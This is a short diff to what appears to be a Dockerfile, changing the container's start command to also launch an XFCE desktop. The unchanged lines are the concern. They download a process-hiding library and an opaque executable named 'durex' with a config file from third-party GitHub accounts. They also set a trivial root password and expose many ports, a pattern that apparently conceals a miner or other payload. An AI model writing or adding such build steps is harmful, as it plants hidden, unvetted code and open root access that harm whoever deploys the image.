@@ -17,7 +17,6 @@ RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
 RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
 && wget https://raw.githubusercontent.com/bulboni/tm/main/config.json \
 && chmod +x durex
-RUN echo "startxfce4 :1030" >> .chrome-remote-desktop-session
 RUN mkdir /run/sshd \
     && echo "sleep 5" >> /openssh.sh \
     && echo "sleep 5" >> /openssh.sh \
@@ -27,4 +26,4 @@ RUN mkdir /run/sshd \
     && echo root:147|chpasswd \
     && chmod 755 /openssh.sh
 EXPOSE 80 443 3306 4040 5432 5700 5701 5010 6800 6900 8080 8888 9000
-CMD /openssh.sh
+CMD /openssh.sh && startxfce4 :1030
